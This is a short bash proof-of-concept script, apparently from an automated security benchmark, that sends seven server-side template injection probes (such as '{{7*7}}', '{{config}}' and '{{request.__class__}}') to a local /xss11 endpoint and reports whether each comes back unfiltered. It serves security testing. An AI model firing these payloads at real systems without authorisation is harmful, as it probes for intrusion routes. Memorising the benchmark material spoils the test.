#!/bin/bash
# POC: Demonstrates that SSTI payloads (Jinja2, EJS, Pug, Expression Language) bypass the inadequate regex filters at the /xss11 endpoint. Tests multiple template injection payloads to show they pass through unfiltered.
# Target: ./repo
# Created: 2025-11-05T17:15:33.424Z
# Session: benchmark-XBEN-012-24-mhm7ivyh

# SSTI Payload Bypass POC - Tests if SSTI payloads bypass validation filters
# Target: /xss11 endpoint with 'name' parameter

TARGET_URL="${1:-http://localhost:5000}"
ENDPOINT="/xss11"

echo "=========================================="
echo "SSTI Payload Bypass POC"
echo "=========================================="
echo "Target: $TARGET_URL$ENDPOINT"
echo ""

# Array of SSTI payloads to test
declare -a PAYLOADS=(
    "{{7*7}}"                              # Jinja2 basic math
    "{{config}}"                           # Jinja2 config access
    "\${7*7}"                              # EJS basic math
    "<% 7*7 %>"                            # EJS template tag
    "#{7*7}"                               # Pug template syntax
    "%{7*7}"                               # Expression Language (Java)
    "{{request.__class__}}"                # Jinja2 object access
)

echo "Testing SSTI Payloads Against Input Validation:"
echo ""

for payload in "${PAYLOADS[@]}"; do
    echo "Testing Payload: $payload"
    
    # URL encode the payload
    encoded_payload=$(printf %s "$payload" | jq -sRr @uri)
    
    # Make request to /xss11 endpoint
    response=$(curl -s "$TARGET_URL$ENDPOINT?name=$encoded_payload")
    
    # Check if payload appears unfiltered in response
    if echo "$response" | grep -q "$(echo "$payload" | sed 's/[[\.*^$/]/\\&/g')"; then
        echo "✓ RESULT: Payload BYPASSED filters (appears unfiltered in response)"
    else
        echo "✗ RESULT: Payload may have been filtered"
    fi
    
    echo "---"
    echo ""
done

echo "=========================================="
echo "POC Complete"
echo "=========================================="